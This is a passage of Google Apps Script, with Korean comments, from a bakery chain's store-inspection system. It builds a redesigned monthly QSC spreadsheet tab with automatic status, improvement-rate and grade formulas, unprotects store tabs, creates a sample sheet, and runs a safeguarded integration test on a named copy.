      (left ? ' · ★못 푼 것 ' + left + '건 — 이 탭은 시트에서 직접 풀어야 합니다★' : ''));
  }
  return out;
}

/* 사본에만. 인자 없이 실행한다. */
function testStoreUnprotect() {
  const id = prop('TEST_STORE_ID', '');
  if (!id) { const m = '★중단★ TEST_STORE_ID가 없습니다.'; Logger.log(m); return m; }
  const ss = SpreadsheetApp.openById(id);
  if (ss.getName().indexOf('_연동테스트') < 0) {
    const m = '★중단★ 대상 파일 이름에 _연동테스트가 없습니다: ' + ss.getName();
    Logger.log(m); return m;
  }
  const out = ['=== 사본 월 탭 보호 풀기 ===', '대상: ' + ss.getName()];
  out.push.apply(out, unprotectMonthTabsIn(ss));
  const msg = out.join('\n'); Logger.log(msg); return msg;
}

/* 실전. ★한 곳만 풀려면 unprotectStoreTabs(['금종제과 익산'])★
   전부 풀려면 인자 없이 → (null, 1) → (null, 2) 순으로 세 번. */
function unprotectStoreTabs(stores, page) {
  const sel = pickPage(stores, page);
  const out = ['=== 매장 월 탭 보호 풀기 ' + (sel.page + 1) + '쪽 · ' +
    sel.list.length + '곳 (전체 ' + sel.total + '곳) ==='];
  const bad = [];
  sel.list.forEach(function (store) {
    out.push('', '── ' + store + ' ──');
    try {
      const id = storeFileId(store);
      if (!id) { out.push('✗ 파일 ID 없음'); bad.push(store); return; }
      const lines = unprotectMonthTabsIn(SpreadsheetApp.openById(id));
      out.push.apply(out, lines);
      if (lines.some(function (l) { return l.charAt(0) === '✗'; })) bad.push(store);
    } catch (e) { out.push('✗ ' + String(e).slice(0, 90)); bad.push(store); }
  });
  out.push('');
  out.push(bad.length ? '★손이 더 필요한 매장 ' + bad.length + '곳 — ' + bad.join(', ')
                      : '✓ 이 쪽은 전부 풀렸습니다.');
  if (sel.left) out.push('★ ' + sel.left + '곳 남음 — 다음: unprotectStoreTabs(null, ' + (sel.page + 1) + ')');
  const msg = out.join('\n');
  Logger.log(msg);
  return msg;
}


/* ══════════════════════════════════════════════════════════════
   새 월별 양식 v2 — 2026-10월부터 (2026-08-20 사용자와 설계)

   ★이 시트가 하는 일은 하나다★
     본사가 "이거 고쳐 주세요"를 적고, 매장이 "이렇게 고쳤습니다"를 적는다.
     그 둘이 맞물려 요청·진행·완료·개선율이 저절로 나오고, 개선율은 종합점수의 10%가 된다.

   ★왜 새로 만드는가 — 옛 양식은 사람이 지켜야 하는 규칙이 있었다★
     '진행 내용'과 '완료 내용' 칸이 따로 있어서 "아직이면 왼쪽, 다 됐으면 오른쪽"을 지켜야 했다.
     26개 매장 × 여러 담당자에게 이 규칙은 반드시 깨진다 — 실제로 미착수인데 완료 칸에 적는
     일이 있었다. ★그래서 칸을 합쳤다.★ 틀릴 칸이 없으면 틀릴 수 없다.

   ★상태는 매장이 고르지 않는다. 시트가 스스로 안다★
       완료일 있음            → 완료
       '본사 협의' 체크        → 본사 확인 대기   (개선율 분모에서 빠진다)
       예정일 있음            → n/n 예정
       조치 내용만 있음        → 진행중
       아무것도 없음          → 미착수

   ★개선율 = 완료 ÷ (전체 − 본사협의)★ (사용자 결정)
     본사가 결정해 줘야 하는 건은 매장 책임이 아니므로 분모에서 뺀다.
     요청이 없거나 전부 본사협의면 빈칸이고, 종합점수 산식이 빈칸을 만점(1)으로 본다.

   ★열 배치 — 본사 몫과 매장 몫이 한 번에 갈린다★
     A NO. · B 구분 · C 문항 · D 개선요청사항 · E 개선 전 · F 상태(수식)   ← 본사 몫
     G 담당부서 · H 담당자 · I 조치 내용 · J 예정일 · K 완료일 · L 본사협의 · M 개선 후 · N 비고  ← 매장 몫
     보호는 'G11:N{끝}만 열기' 한 구간으로 끝난다 — 열을 세다 틀릴 자리가 없다.
     ★머리글에 '담당부서'와 '비고'가 있어야 한다★ — storeCellsIn 이 그 둘로 매장 칸을 찾는다.
   ══════════════════════════════════════════════════════════════ */

const V2_ROW0 = 11;      // 본문 첫 줄
const V2_ROWS = 50;      // 표 줄 수 (11~60)
const V2_HEAD = 10;      // 머리글 줄

/* 점수 → 등급. 엑셀 채점기준과 같은 경계(전부 '이상'). */
function v2GradeFormula(cell) {
  return '=IF(' + cell + '="","",IFS(' + cell + '>=93,"우수",' + cell + '>=85,"양호",' +
    cell + '>=76,"보통",' + cell + '>=66,"미흡",' + cell + '>=55,"주의",TRUE,"부적합"))';
}

/* 한 탭을 새 양식으로 그린다. 빈 시트를 받아 채운다. */
function buildV2Tab(sh, ym, storeName) {
  const R0 = V2_ROW0, RN = V2_ROWS, END = R0 + RN - 1, H = V2_HEAD;
  sh.clear();
  try { sh.clearConditionalFormatRules(); } catch (e) { }
  if (sh.getMaxColumns() > 14) sh.deleteColumns(15, sh.getMaxColumns() - 14);
  if (sh.getMaxColumns() < 14) sh.insertColumnsAfter(sh.getMaxColumns(), 14 - sh.getMaxColumns());
  if (sh.getMaxRows() < END + 2) sh.insertRowsAfter(sh.getMaxRows(), END + 2 - sh.getMaxRows());

  const title = (storeName || '') + '  ' + ymLabel(ym) + ' QSC 현황';
  sh.getRange('A1:N1').merge().setValue(title)
    .setFontSize(15).setFontWeight('bold').setVerticalAlignment('middle');
  sh.setRowHeight(1, 38);

  /* ── 요약 (2~8행) ──────────────────────────────────────────
     ★라벨 글자를 바꾸지 말 것★ — 앱(labelMap/labelValue)이 이 글자로 값 칸을 찾는다. */
  const put = function (r, c, v) { sh.getRange(r, c).setValue(v); };
  const lab = function (r, c, v) {
    sh.getRange(r, c).setValue(v).setFontWeight('bold').setBackground('#f1f3f4')
      .setHorizontalAlignment('right');
  };

  lab(3, 1, '방문일');       put(3, 2, '');
  lab(3, 4, '점검자');       put(3, 5, '');
  lab(4, 1, '위생점수');     lab(4, 4, '위생등급');
  lab(5, 1, 'CS점수');       lab(5, 4, 'CS등급');
  sh.getRange(4, 5).setFormula(v2GradeFormula('$B$4'));
  sh.getRange(5, 5).setFormula(v2GradeFormula('$B$5'));
  sh.getRange('B4:B5').setNumberFormat('0.0');

  lab(6, 1, '개선요청');   lab(6, 3, '개선완료');
  lab(6, 5, '개선예정/진행'); lab(6, 7, '본사협의');
  /* ★개선요청 칸은 반드시 =COUNTA(D…) 형태로 둔다★ — tableEndRow 가 이 수식에서 표 끝 줄을 읽는다.
     그 값이 곧 보호 예외 범위의 끝이 된다. 손으로 숫자를 적으면 표 끝을 아무도 모르게 된다. */
  sh.getRange(6, 2).setFormula('=COUNTA(D' + R0 + ':D' + END + ')');
  sh.getRange(6, 4).setFormula('=COUNTA(K' + R0 + ':K' + END + ')');
  sh.getRange(6, 6).setFormula('=MAX(0,$B$6-$D$6-$H$6)');
  sh.getRange(6, 8).setFormula('=COUNTIF(L' + R0 + ':L' + END + ',TRUE)');

  lab(7, 1, '개선율');
  /* 완료 ÷ (전체 − 본사협의). 분모가 0이면 빈칸 — 종합 산식이 빈칸을 만점으로 본다. */
  sh.getRange(7, 2).setFormula('=IF($B$6-$H$6<=0,"",$D$6/($B$6-$H$6))').setNumberFormat('0%');
  sh.getRange('C7:N7').merge()
    .setValue('완료 ÷ (개선요청 − 본사협의).  본사가 결정해 줘야 하는 건은 매장 몫이 아니므로 빼고 셉니다.')
    .setFontSize(10).setFontColor('#666666');

  lab(8, 1, '종합점수');   lab(8, 4, '종합등급');
  sh.getRange(8, 2).setFormula('=IF(COUNT($B$4,$B$5)=0,"",$B$4*0.6+$B$5*0.3+IF($B$7="",1,$B$7)*100*0.1)')
    .setNumberFormat('0.0');
  sh.getRange(8, 5).setFormula(v2GradeFormula('$B$8'));
  sh.getRange('A8:N8').setBackground('#fff8e1');
  sh.getRange(8, 1, 1, 5).setFontWeight('bold');

  /* ── 표 머리글 (10행) ─────────────────────────────────── */
  const HEAD = ['NO.', '구분', '문항', '개선요청사항', '개선 전',
    '상태', '담당부서', '담당자', '조치 내용', '예정일', '완료일', '본사협의', '개선 후', '비고'];
  sh.getRange(H, 1, 1, 14).setValues([HEAD])
    .setFontWeight('bold').setHorizontalAlignment('center')
    .setVerticalAlignment('middle').setWrap(true);
  sh.getRange(H, 1, 1, 6).setBackground('#e8eaed');    // 본사 몫
  sh.getRange(H, 7, 1, 8).setBackground('#e6f4ea');    // 매장 몫
  sh.setRowHeight(H, 34);
  sh.getRange(9, 1, 1, 6).merge().setValue('▼ 본사가 적습니다')
    .setFontSize(10).setFontColor('#5f6368');
  sh.getRange(9, 7, 1, 8).merge().setValue('▼ 매장이 적습니다')
    .setFontSize(10).setFontColor('#137333').setFontWeight('bold');

  /* ── 본문 ─────────────────────────────────────────────── */
  const nos = [];
  for (let i = 0; i < RN; i++) nos.push(['=IF($D' + (R0 + i) + '="","",ROW()-' + (R0 - 1) + ')']);
  sh.getRange(R0, 1, RN, 1).setFormulas(nos).setHorizontalAlignment('center');

  /* 상태 — ★매장이 고르지 않는다★ */
  const st = [];
  for (let i = 0; i < RN; i++) {
    const r = R0 + i;
    st.push(['=IF($D' + r + '="","",' +
      'IF($K' + r + '<>"","완료",' +
      'IF($L' + r + '=TRUE,"본사 확인 대기",' +
      'IF($J' + r + '<>"",TEXT($J' + r + ',"m/d")&" 예정",' +
      'IF($I' + r + '<>"","진행중","미착수")))))']);
  }
  sh.getRange(R0, 6, RN, 1).setFormulas(st).setHorizontalAlignment('center').setFontWeight('bold');

  sh.getRange(R0, 12, RN, 1).insertCheckboxes();                      // 본사협의
  const onlyDate = SpreadsheetApp.newDataValidation().requireDate()
    .setAllowInvalid(false)
    .setHelpText('날짜만 넣을 수 있습니다. 「완료」·「O」 같은 글자는 들어가지 않습니다.').build();
  sh.getRange(R0, 10, RN, 2).setDataValidation(onlyDate).setNumberFormat('yyyy-mm-dd');  // 예정일·완료일

  const kind = SpreadsheetApp.newDataValidation()
    .requireValueInList(['위생', '매장관리', '서류'], true).setAllowInvalid(false).build();
  sh.getRange(R0, 2, RN, 1).setDataValidation(kind);

  sh.getRange(R0, 1, RN, 14).setVerticalAlignment('top').setWrap(true);
  sh.getRange(R0, 1, RN, 14).setBorder(true, true, true, true, true, true,
    '#dadce0', SpreadsheetApp.BorderStyle.SOLID);

  /* ── 눈에 띄게 ─────────────────────────────────────────
     ★막는 것이 아니라 알아채게 하는 장치다★ — 막는 일은 위의 '칸 합치기'와 날짜 유효성이 한다. */
  const rules = [];
  const body = sh.getRange(R0, 1, RN, 14);
  rules.push(SpreadsheetApp.newConditionalFormatRule()
    .whenFormulaSatisfied('=AND($D' + R0 + '<>"",$K' + R0 + '<>"",$I' + R0 + '="")')
    .setBackground('#fce8e6')     // 완료일은 있는데 조치 내용이 비었다
    .setRanges([body]).build());
  rules.push(SpreadsheetApp.newConditionalFormatRule()
    .whenFormulaSatisfied('=AND($D' + R0 + '<>"",$K' + R0 + '<>"")')
    .setBackground('#e6f4ea')     // 완료
    .setRanges([body]).build());
  rules.push(SpreadsheetApp.newConditionalFormatRule()
    .whenFormulaSatisfied('=AND($D' + R0 + '<>"",$L' + R0 + '=TRUE)')
    .setBackground('#e8f0fe')     // 본사 확인 대기
    .setRanges([body]).build());
  sh.setConditionalFormatRules(rules);

  const W = [46, 90, 110, 320, 90, 110, 90, 80, 300, 96, 96, 76, 90, 160];
  for (let c = 0; c < W.length; c++) sh.setColumnWidth(c + 1, W[c]);
  sh.setFrozenRows(H);
  sh.setFrozenColumns(4);
  return sh;
}

/* ★새 양식 견본을 하나 만든다★ — 인자 없이 편집기에서 실행한다.
   실매장 파일에 닿지 않는다. 새 스프레드시트를 만들어 그 안에만 그린다. */
function makeV2Sample() {
  const ss = SpreadsheetApp.create('[새 양식 v2] 매장 월별 QSC현황 — 구조확인용');
  const sh = ss.getSheets()[0];
  sh.setName('2610');
  buildV2Tab(sh, '2610', '금종제과 익산');

  /* 눈으로 보기 좋게 예시를 몇 줄 넣는다 — 상태 칸이 스스로 바뀌는 것을 보여 준다 */
  sh.getRange(3, 2).setValue(new Date());
  sh.getRange(3, 5).setValue('문수');
  sh.getRange(4, 2).setValue(88);
  sh.getRange(5, 2).setValue(92);
  const R0 = V2_ROW0;
  sh.getRange(R0, 2, 5, 3).setValues([
    ['위생', 'A-05', '원산지 표시, 알레르기표시 미게시 (고객이 잘 보이는 위치)'],
    ['위생', 'C-03', '소비기한 경과 제품 진열'],
    ['매장관리', 'F-15', '홀 체류 쾌적성 미흡 — 냉방 온도 관리'],
    ['서류', 'A-01', '인허가 서류 미비치 (자가품질검사 성적서)'],
    ['매장관리', 'D-07', '집기 파손 — 교체 필요'],
  ]);
  sh.getRange(R0, 7, 5, 5).setValues([
    ['홀', '김OO', '게시물 새로 출력해 부착 완료', '', new Date()],
    ['주방', '이OO', '전 품목 소비기한 재점검, 폐기 처리', '', new Date()],
    ['홀', '박OO', '냉방 설정 조정 중, 서큘레이터 추가 검토', new Date(new Date().getTime() + 7 * 864e5), ''],
    ['관리', '최OO', '', '', ''],
    ['홀', '정OO', '본사 승인 필요 — 집기 교체 예산', '', ''],
  ]);
  sh.getRange(R0 + 4, 12).setValue(true);   // 마지막 건 = 본사 협의 필요

  const url = ss.getUrl();
  const msg = ['=== 새 양식 v2 견본을 만들었습니다 ===', url, '',
    '보실 것:',
    '  · F열 상태 — 아무도 안 적었는데 완료/진행중/예정/미착수/본사 확인 대기가 나옵니다',
    '  · B7 개선율 — 완료 2 ÷ (요청 5 − 본사협의 1) = 50%',
    '  · B8 종합 — 88×0.6 + 92×0.3 + 50%×0.1',
    '  · K열(완료일)에 「완료」라고 적어 보십시오 — 시트가 거부합니다',
    '  · 4번째 줄은 아무것도 안 적어서 미착수, 5번째 줄은 본사협의 체크',
  ].join('\n');
  Logger.log(msg);
  return msg;
}

function testStoreCopy(srcId, ym) {
  const SRC = srcId || '1mUSyz0ItpTa5HsUKVHWqxhD3wTobdP9xJO4NdNQ0InE'; // 금종제과_익산 (원본 — 읽기만)
  ym = ym || '2610';
  const out = [];
  const TAG = '_연동테스트';

  // ── 1. 사본 만들기 (없으면) ─────────────────────────────
  let id = prop('TEST_STORE_ID', '');
  if (!id) {
    const copy = DriveApp.getFileById(SRC).makeCopy(
      DriveApp.getFileById(SRC).getName() + TAG);
    id = copy.getId();
    PROPS.setProperty('TEST_STORE_ID', id);
    out.push('① 사본 생성: ' + copy.getName());
  } else {
    out.push('① 사본 재사용: ' + id);
  }

  // ── 안전장치 ② 이름 확인 ────────────────────────────────
  const ss = SpreadsheetApp.openById(id);
  if (ss.getName().indexOf(TAG) < 0) {
    const msg = '★중단★ 대상 파일 이름에 ' + TAG + '가 없습니다: ' + ss.getName();
    Logger.log(msg);
    return msg;
  }
  out.push('   대상: ' + ss.getName() + '  (원본 아님을 확인)');

  // ── 2. 월 탭 자동 생성 ──────────────────────────────────
  const before = monthTabs(ss).join(',');
  out.push('② 탭(생성 전): ' + before);
  /* ★같은 달로 다시 돌릴 수 있게 이전 테스트 탭을 지운다★ (2026-08-18)
     makeMonthTabIn은 탭이 이미 있으면 '이미 있음'만 돌려주고 아무것도 안 한다. 그러면
     두 번째 실행부터는 ★새로 만드는 과정(숨김 해제·제목 교체·새 산식)이 검증되지 않는다★.
     10월에도 이 테스트를 다시 돌릴 것이므로 반복 가능하게 만들어 둔다.
     지우는 대상은 위에서 이름에 _연동테스트가 있음을 확인한 ★사본★뿐이다.
     원본에는 이 함수가 애초에 닿지 않는다(SRC는 makeCopy의 소스로만 쓰인다). */
  const dead = ss.getSheetByName(ym);
  if (dead) {
    ss.deleteSheet(dead);
    out.push('   ↺ 이전 테스트 탭 ' + ym + ' 삭제 (다시 만들어 전 과정을 검증한다)');
  }

  const made = makeMonthTabIn(ss, ym);
  out.push('   ' + made.mark + ' ' + made.msg);
  const sh = ss.getSheetByName(ym);
  if (!sh) { const m = out.join('\n'); Logger.log(m); return m; }

  // ── 3. 서식이 살아남았는가 ──────────────────────────────
  const merges = sh.getRange(11, 2, 6, 14).getMergedRanges().map(function (r) { return r.getA1Notation(); });
  out.push('③ 11~16행 병합: ' + (merges.length ? merges.join(' ') : '없음 ★clear()로 날아갔을 수 있음★'));
  let dv = '없음';
  try {
    const r = sh.getRange(12, 11); // K12 담당부서
    dv = r.getDataValidation() ? '있음' : '없음 ★드롭다운 소실★';
  } catch (e) { dv = '확인 실패'; }
  out.push('   K12 담당부서 드롭다운: ' + dv);

  // ── 4. 수식이 남아 계산되는가 ───────────────────────────
  const lm = labelMap(sh);
  /* ★별칭 목록으로 찾는다★ — 종전에는 '개선요청' 한 낱말만 찾아서 실물 라벨('개선요청사항')을
     못 만나 로그에 '라벨 못 찾음'이 찍혔다. 실제 앱(readStoreTab)은 REQ_LABELS로 잘 찾는데
     ★검증 도구만 고장난 것처럼 보였다★. 거짓 경보를 내는 검사는 진짜 문제를 못 믿게 만든다. */
  [['개선요청', REQ_LABELS], ['개선완료', ['개선완료', '조치완료', '완료']],
   ['미조치', ['미조치', '미이행']], ['개선율', ['개선율']]].forEach(function (pair) {
    const lab = pair[0];
    const p = labelValue(lm, pair[1]);
    if (!p.found || !p.row) { out.push('   ' + lab + ' : 라벨 못 찾음'); return; }
    const c = sh.getRange(p.row, p.col);
    const f = String(c.getFormula() || '');
    out.push('   ' + lab + ' @' + c.getA1Notation() + ' : ' + (f ? '수식 ' + f.slice(0, 40) : '값 ' + c.getValue()));
  });

  // ── 5. 본사 기록이 매장 몫을 건드리지 않는가 ────────────
  // 매장이 이미 적어 둔 것처럼 K~O에 표식을 넣어 두고, 본사 기록 뒤에 살아 있는지 본다
  const row = 12;
  sh.getRange(row, 11, 1, 5).setValues([['F&B 3팀', '점장', '진행중 메모', '완료 메모', '매장사진자리']]);
  SpreadsheetApp.flush();
  const p2 = {
    store: '연동테스트', date: '2026-' + ym.slice(2) + '-05', time: '10:00',
    items: [{ no: 1, code: 'A-01', group: '관리', text: '사본 테스트 문항', value: 2, severity: '', memo: '테스트' }],
    result: {},
  };
  let w;
  try { w = writeStoreQscInto(ss, p2, {}, ym); }
  catch (e) { w = { ok: false, error: String(e) }; }
  out.push('④ 본사 기록: ' + JSON.stringify(w));
  const after = sh.getRange(row, 2, 1, 14).getValues()[0];
  out.push('   12행 B~O: ' + after.map(function (v) { return String(v).slice(0, 12); }).join(' | '));
  const keep = sh.getRange(row, 11, 1, 5).getValues()[0].join('|');
  out.push('   매장 몫 K~O 보존: ' + (keep.indexOf('F&B 3팀') === 0 ? '✓ 그대로' : '✗ 덮어써짐 → ' + keep));

  const msg = out.join('\n');
  Logger.log(msg);
  return msg;
}

/* 사본 정리. 다 보고 나면 이걸 눌러 휴지통으로 보낸다. */
function testStoreCopyCleanup() {
  const id = prop('TEST_STORE_ID', '');
  if (!id) return '지울 사본이 없습니다.';
  const f = DriveApp.getFileById(id);
  if (f.getName().indexOf('_연동테스트') < 0) return '★중단★ 이름이 사본 같지 않습니다: ' + f.getName();
  f.setTrashed(true);
  PROPS.deleteProperty('TEST_STORE_ID');
  const m = '사본을 휴지통으로 보냈습니다: ' + f.getName();
  Logger.log(m);
  return m;
}
